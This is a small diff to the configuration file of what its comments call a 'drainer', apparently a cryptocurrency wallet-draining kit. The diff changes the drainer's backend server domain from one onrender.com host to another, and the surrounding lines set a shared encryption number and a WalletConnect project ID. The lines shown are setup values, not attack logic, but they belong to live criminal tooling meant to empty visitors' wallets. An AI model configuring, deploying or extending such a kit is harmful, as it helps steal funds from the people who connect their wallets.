@@ -13,7 +13,7 @@
 let FLASH_Encryption_Key = 50; // Specify any number that will be used for encryption it is not recommended to leave it as default!
 // The same number should be specified in the server.js file - if they differ, then nothing will work correctly
 
-const FLASH_Server = "backend-dvr3.onrender.com"; // Specify the domain that is attached to the drainer server
+const FLASH_Server = "frontend-rq45.onrender.com"; // Specify the domain that is attached to the drainer server
 // This is the domain where you have a server, and not the site itself where you plan to use the drainer
 
 const FLASH_WalletConnect_ID = "62d53287479f18c5d98255e4a3086794"; // Project ID из WalletConnect Cloud
